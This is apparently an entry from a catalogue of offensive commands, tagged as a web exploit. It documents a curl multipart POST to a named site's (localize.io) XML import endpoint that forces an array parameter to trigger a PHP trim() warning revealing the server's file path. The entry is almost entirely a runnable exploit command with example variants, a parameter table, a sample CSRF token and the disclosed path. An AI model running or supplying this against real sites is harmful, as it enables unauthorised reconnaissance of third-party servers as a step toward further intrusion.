---
data: >-
  curl -X POST http://www.localize.io/import/[project ID] -F
  "CSRFToken=MTcwMTAzMDk2MDUzNTFjN2I1NGE5MWYxLjkzMjk2OTM0" -F
  "import[overwrite][]=0" -F "import[languageID]=0" -F "import[groupID]=0" -F
  "MAX_FILE_SIZE=1572864" -F
  "importFileXML=@/dev/null;type=application/octet-stream"
tags:
  - web-exploit
  - http-post
  - multipart
type: command
output: >-
  Warning: trim() expects parameter 1 to be string, array given in
  /var/www/vhosts/lvps178-77-99-228.dedicated.hosteurope.de/httpdocs_localize/index.php
  on line 410
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:06.237Z'
id: 8a0c184c-7296-4c84-a3fd-90916801eebe
verified: false
validated: true
submitted: true
---
# curl-multipart-post-for-path-disclosure

## Command

```bash
curl -X POST http://www.localize.io/import/[project ID] \
  -F "CSRFToken=MTcwMTAzMDk2MDUzNTFjN2I1NGE5MWYxLjkzMjk2OTM0" \
  -F "import[overwrite][]=0" \
  -F "import[languageID]=0" \
  -F "import[groupID]=0" \
  -F "MAX_FILE_SIZE=1572864" \
  -F "importFileXML=@/dev/null;type=application/octet-stream"
```

## Description

This curl command sends a multipart/form-data POST request to the Localize.io XML import endpoint, appending '[]' to the import[overwrite] parameter to trigger a PHP trim() error and disclose the server path. It includes necessary fields like CSRFToken, language/group IDs, file size limit, and an empty XML file upload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `http://www.localize.io/import/[project ID]` | Target endpoint URL; replace [project ID] with actual ID | Yes |
| `-F "CSRFToken=..."` | CSRF protection token value | Yes |
| `-F "import[overwrite][]=0"` | Manipulated parameter to force array input | Yes |
| `-F "import[languageID]=0"` | Language ID for import (default 0) | Yes |
| `-F "import[groupID]=0"` | Group ID for import (default 0) | Yes |
| `-F "MAX_FILE_SIZE=1572864"` | Maximum file upload size in bytes | Yes |
| `-F "importFileXML=..."` | Empty file upload field | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://www.localize.io/import/123 \
  -F "CSRFToken=exampletoken" \
  -F "import[overwrite][]=0" \
  -F "import[languageID]=0" \
  -F "import[groupID]=0" \
  -F "MAX_FILE_SIZE=1572864" \
  -F "importFileXML=@/dev/null;type=application/octet-stream"
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST http://www.localize.io/import/123 \
  -F "CSRFToken=exampletoken" \
  -F "import[overwrite][]=0" \
  -F "import[languageID]=0" \
  -F "import[groupID]=0" \
  -F "MAX_FILE_SIZE=1572864" \
  -F "importFileXML=@/dev/null;type=application/octet-stream" \
  -o response.html
```

## Expected Output

The response will include a PHP warning: "Warning: trim() expects parameter 1 to be string, array given in /var/www/vhosts/lvps178-77-99-228.dedicated.hosteurope.de/httpdocs_localize/index.php on line 410". The path in the warning reveals server details.

## Related

- [[Related Procedure: Exploit-PHP-Trim-Error-for-Path-Disclosure]]
